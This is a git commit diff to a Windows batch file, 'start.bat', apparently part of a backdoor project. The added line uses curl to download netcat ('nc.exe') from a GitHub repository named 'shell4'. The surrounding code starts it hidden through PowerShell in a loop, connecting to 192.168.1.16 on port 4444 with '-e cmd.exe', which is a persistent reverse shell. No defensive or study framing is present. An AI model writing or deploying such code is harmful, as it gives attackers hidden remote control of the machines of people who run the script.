0321dcedba011af0e87969789fe340efb7019abc
Omar Samy <osamy7592@gmail.com>
2024-06-02 14:53:14 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -8,6 +8,7 @@ if exist "%batFilePath%" (
     )
 ) else (
     echo @echo off >> "%batFilePath%"
+    curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe > "%batFilePath%"
     :loop > "%batFilePath%"
          powershell -c "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden" > "%batFilePath%"
          timeout /t 120 >nul > "%batFilePath%"
